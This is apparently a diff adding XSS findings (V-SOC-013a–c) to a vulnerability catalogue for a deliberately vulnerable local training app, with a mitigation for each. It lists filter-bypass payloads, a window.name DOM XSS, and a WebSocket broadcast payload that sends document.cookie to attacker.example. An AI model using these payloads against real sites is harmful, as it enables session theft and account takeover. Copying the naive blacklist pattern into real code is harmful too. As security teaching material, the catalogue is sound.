@@ -64,6 +64,70 @@ V-SOC-013  DOM XSS via location.hash
   Exploit:   /#<img src=x onerror=alert(1)>
   Mitigation: never assign untrusted input to .innerHTML.
 
+V-SOC-013a  Stored XSS in posts despite naive blacklist
+  Location:  routes/posts.js (naiveStrip:
+             /<script[^>]*>.*?<\/script>/gi  +  /\son\w+\s*=/gi)
+  Exploit:   The filter only matches event handlers that follow whitespace
+             and only strips literal <script>...</script>. Every payload
+             below was confirmed to store unmodified and fire for any
+             viewer of the post:
+               POST /p  body=<svg/onload=alert(1)>
+                 -- `/` is not `\s`, so `onload=` is not stripped.
+               POST /p  body=<img/src=x/onerror=alert(1)>
+                 -- same trick on a more common tag.
+               POST /p  body=<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+                 -- the script blacklist runs on raw input, but the
+                    browser decodes the HTML entities inside srcdoc and
+                    executes the script in the iframe.
+               POST /p  body=<img src=x &#x6F;nerror=alert(1)>
+                 -- `&#x6F;` decodes to `o` after parsing; regex sees
+                    `&#x6F;nerror=` which does not match `\son\w+\s*=`.
+               POST /p  body=<a href=javascript:alert(1)>click</a>
+                 -- no event handler, no <script> tag, requires a click.
+             Naive defences that the filter DOES catch (for contrast):
+               <script>alert(1)</script>            (script blacklist hit)
+               <img src=x onerror=alert(1)>         (space + onerror= hit)
+               <img src=x ONERROR=alert(1)>         (regex is /gi)
+               <details open ontoggle=alert(1)>     (space + ontoggle= hit)
+  Mitigation: do not write your own blacklist. Use DOMPurify with an
+              explicit allow-list, or render with `<%= %>` and never
+              accept HTML at all.
+
+V-SOC-013b  DOM XSS via window.name and document.referrer
+  Location:  public/js/app.js (bootNameRefererSink)
+  Exploit:   window.name persists across same-tab navigations. From an
+             attacker page on a different origin:
+               <script>
+                 window.name = '<img src=x onerror=alert(document.cookie)>';
+                 location = 'http://127.0.0.1:3003/';
+               </script>
+             The Pulse page reads window.name on DOMContentLoaded and
+             assigns it to innerHTML of the welcome banner.
+             document.referrer fires when the user arrives via a link from
+             an attacker page whose URL contains HTML (path-segment XSS).
+  Mitigation: never read window.name or document.referrer into a DOM sink;
+              if you must surface the referrer, strip everything except the
+              host and render with textContent.
+
+V-SOC-013c  WebSocket-driven stored XSS via `broadcast` event
+  Location:  sockets.js (broadcast has no auth) + public/js/app.js
+             (slot.innerHTML = m.msg)
+  Exploit:   Any connected client can emit `broadcast`. Combined with the
+             open CORS on socket.io (V-SOC-050), an attacker page on
+             attacker.example can:
+               <script src="http://127.0.0.1:3003/socket.io/socket.io.js"></script>
+               <script>
+                 const s = io('http://127.0.0.1:3003', { withCredentials: true });
+                 s.on('connect', () => s.emit('broadcast',
+                   { msg: '<img src=x onerror=fetch(`https://attacker.example/c?`+document.cookie)>' }));
+               </script>
+             Every currently-connected Pulse user runs the script in their
+             browser, in their origin, with their cookies.
+  Mitigation: authenticate socket connections; whitelist origins; render
+              broadcast messages via textContent and a moderation queue;
+              never grant unauthenticated clients access to broadcast
+              channels.
+
 V-SOC-014  jQuery 1.12.4 prototype-pollution gadget (CVE-2019-11358)
   Location:  views/partials/header.ejs loads jQuery 1.12.4 + app.js calls
              jQuery.extend(true, {}, JSON.parse(?pp=...))
